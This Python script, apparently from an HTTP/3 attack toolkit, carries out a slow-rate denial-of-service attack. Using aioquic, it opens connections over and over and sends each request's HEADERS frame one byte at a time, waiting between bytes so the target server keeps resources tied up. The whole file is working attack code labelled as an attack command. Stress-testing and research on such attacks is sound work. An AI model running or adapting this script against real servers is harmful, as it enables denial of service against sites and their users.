
import asyncio
import itertools
import logging
from aioquic.h3.connection import FrameType, encode_frame
from aioquic_http3_client import USER_AGENT, HttpClient
from utils import attack_command, calculate_slowrate_wait_time, h3_connection_loop, h3_request_stream

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S')


@attack_command()
@h3_connection_loop()
async def main(addr, con: HttpClient, *args, **kwargs):
    h3_con = con.http
    while True:
        async with h3_request_stream(con) as stream_id:
            header_data = h3_con._encode_headers(stream_id, headers=[
                (b":method", b'GET'),
                (b":scheme", b'https'),
                (b":authority", f'{addr[0]}:{addr[1]}'.encode()),
                (b":path", b'/'),
                (b"user-agent", USER_AGENT.encode()),
            ])
            header_frame = encode_frame(FrameType.HEADERS, header_data)

            for b in map(bytes, itertools.batched(header_frame, 1)):
                logging.info(f'Sending HTTP/3 frame part: {b}')
                h3_con._quic.send_stream_data(stream_id, data=b)
                con.transmit()
                await asyncio.sleep(calculate_slowrate_wait_time(con._quic))

            # Finish request
            h3_con.send_data(stream_id, data=b'', end_stream=True)


if __name__ == '__main__':
    main()
